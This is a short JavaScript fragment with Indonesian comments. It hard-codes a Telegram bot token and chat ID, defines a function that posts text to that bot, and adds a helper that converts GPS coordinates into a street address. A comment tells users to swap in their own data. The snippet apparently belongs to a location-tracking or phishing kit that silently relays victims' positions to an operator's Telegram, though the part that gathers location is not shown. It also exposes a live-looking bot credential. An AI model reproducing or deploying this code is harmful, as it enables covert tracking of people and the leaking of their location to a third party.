// GANTI DENGAN DATA LU, BABI!
const TG_TOKEN = '8608872531:AAHThphIIHShI7aXt3GbjlvUHS8_MYDWTq4'; 
const CHAT_ID = '8383847520'; 

async function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
    });
}

// LOGIKA PENGOLAHAN GPS JADI LOKASI (Reverse Geocoding)
async function getAddressFromCoords(lat, lon) {
    try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const data = await res.json();
        return data.display_name || "Lokasi Tidak Terdeteksi";
    } catch (e) { return "Gagal mengambil nama lokasi"; }
}
